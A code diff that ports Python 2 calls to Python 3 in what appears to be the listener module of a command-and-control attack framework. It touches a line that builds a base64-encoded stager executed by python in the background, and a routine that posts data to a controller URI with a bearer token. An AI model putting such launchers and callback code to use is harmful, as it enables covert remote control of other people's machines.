@@ -348,7 +348,7 @@ class Listener(object):
 
                 if encode:
                     launchEncoded = base64.b64encode(launcherBase)
-                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | /usr/bin/python &" % (launchEncoded)
+                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python3 &" % (launchEncoded)
                     return launcher
                 else:
                     return launcherBase
@@ -653,7 +653,7 @@ def send_message(packets=None):
     def post_message(uri, data, headers):
         req = urllib2.Request(uri)
         headers['Authorization'] = "Bearer REPLACE_API_TOKEN"
-        for key, value in headers.iteritems():
+        for key, value in headers.items():
             req.add_header("%s"%(key),"%s"%(value))
 
         if data:
